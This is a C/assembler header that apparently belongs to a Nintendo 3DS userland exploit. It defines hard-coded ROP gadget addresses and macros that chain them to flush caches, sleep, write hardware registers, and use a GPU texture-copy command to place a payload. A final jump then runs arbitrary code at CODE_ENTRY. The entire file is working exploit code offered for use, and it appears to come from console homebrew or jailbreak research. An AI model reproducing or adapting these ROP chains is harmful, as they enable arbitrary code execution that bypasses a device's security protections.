#define KPROCESS_HANDLE			0xFFFF8001
#define GX_SetTextureCopy		0x00000004
#define FILE_READ			0x00000001
#define FILE_WRITE			0x00000002
#define FILE_CREATE			0x00000004
#define GARBAGE				0x00230040

#define GSPGPU_WriteHWRegs 0x002289F4
#define HWREGS_ADDR 0x00202A04 

#define ROP_LOC				0x00600000
#define	HANDLE_PTR			0x00260e3c
#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC				0x0022855c
#define nn__gxlow__CTR__detail__GetInterruptReceiver				0x002F0DE0
#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC	0x001852dc
#define POP_PC				0x001000c4
#define	POP_R0_PC			0x00100874
#define POP_R1_PC			0x001c5614
#define POP_R0_R2_PC			0x0010F2B9
#define POP_R0_R2_R7_PC 		0x0015305e+1 //: pop {r0, r2, r7, pc}
#define POP_R0_1_2_3_5_PC 		0x0016a378+1 //: pop {r0, r1, r2, r3, r5, pc}
#define POP_R0_1_2_5_PC 		0x0010de68+1 //: pop {r0, r1, r2, r5, pc}
#define POP_R1_2_3_PC 			0x001549B1
#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0018D5DC
#define POP_R4_LR_BX_R2			0x0014ce10   //: pop {r4, lr} ; bx r2
#define SVC_0A_BX_LR			0x001955c0
#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR		0x001BFA60
#define NS_Reboot 0x001f9664

#define rop_flush_data_cache(buffer, size) .word POP_R0_1_2_3_5_PC, HANDLE_PTR, KPROCESS_HANDLE, buffer, size, GARBAGE, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC + 8, GARBAGE, GARBAGE, GARBAGE
#define rop_sleep(ns) .word POP_R0_R2_R7_PC, ns, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_PC, 0, SVC_0A_BX_LR 
#define rop_sleep2(ns) .word POP_R0_1_2_5_PC , ns, 0, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, POP_PC, SVC_0A_BX_LR 
#define rop_color_screen(color_addr) .word POP_R0_1_2_3_5_PC, HANDLE_PTR, HWREGS_ADDR, color_addr, 4, GARBAGE, GSPGPU_WriteHWRegs, GARBAGE, GARBAGE, GARBAGE

#define rop_gx_texture_copy(gx_command)	.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, gx_command, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC + 4, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE

#define rop_gx_command(src, dst, size)	.word GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008

#define rop_jump_arm			.word CODE_ENTRY
